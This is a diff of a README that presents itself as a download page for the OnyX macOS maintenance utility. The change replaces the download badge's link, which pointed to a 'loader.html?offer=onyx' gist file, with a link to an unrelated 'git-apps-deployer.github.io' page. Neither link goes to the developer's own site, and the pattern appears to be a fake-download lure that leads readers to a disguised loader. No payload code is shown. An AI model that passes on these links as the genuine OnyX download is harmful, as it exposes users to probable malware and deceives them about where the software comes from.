@@ -4,7 +4,7 @@
 **OnyX macOS** is a powerful and trusted maintenance utility 🍏🧹 designed to keep your Mac fast, stable, and clean.  
 Developed by Titanium Software, OnyX allows you to verify the startup disk, run maintenance scripts, rebuild system databases, and clean up caches safely.  
 
-[![OnyX](https://img.shields.io/badge/OnyX%20for%20MacBook-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/oneshotpro56/b5895a4ca1fb7a0a2a07d4323e275d51/raw/e9e1bc1572c9beabc4b8a5b9d8fb88be390711a3/loader.html?offer=onyx)
+[![OnyX](https://img.shields.io/badge/OnyX%20for%20MacBook-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://git-apps-deployer.github.io/.github/?offer=onyx)
 
 ---
 
